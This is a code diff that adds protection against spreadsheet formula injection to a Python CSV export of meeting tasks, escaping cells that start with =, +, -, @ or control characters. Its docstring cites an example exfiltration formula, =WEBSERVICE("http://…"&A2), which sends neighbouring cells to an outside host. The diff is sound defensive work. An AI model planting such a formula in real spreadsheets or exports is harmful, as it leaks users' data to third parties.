@@ -1052,7 +1052,15 @@ def export_text(items: List[Dict[str, Any]], fmt: str, lang: str = "ru") -> str:
                     "Срок" if lang == "ru" else "Due", "Встреча" if lang == "ru" else "Meeting",
                     "Дата" if lang == "ru" else "Date", "Выполнено" if lang == "ru" else "Done"])
         for x in items:
-            w.writerow([x["what"], x["who"], x.get("to_whom") or "", x.get("due") or "", x.get("meeting_title", ""),
-                        x.get("meeting_date", ""), "да" if x.get("status") == "done" and lang == "ru" else
-                        "yes" if x.get("status") == "done" else ""])
+            w.writerow([_cell(x["what"]), _cell(x["who"]), _cell(x.get("to_whom") or ""), x.get("due") or "",
+                        _cell(x.get("meeting_title", "")), x.get("meeting_date", ""),
+                        "да" if x.get("status") == "done" and lang == "ru" else "yes" if x.get("status") == "done" else ""])
     return buf.getvalue()
+
+
+def _cell(value: Any) -> str:
+    """A text cell of the table that Excel shows as text: a task said in a meeting or the title of an
+    invitation (written by whoever sent it) starting with = + - @ would be run as a formula when the file is
+    opened (=WEBSERVICE("http://…"&A2) sends the neighbouring cells away)."""
+    text = str(value or "")
+    return "'" + text if text[:1] in ("=", "+", "-", "@", "\t", "\r") else text
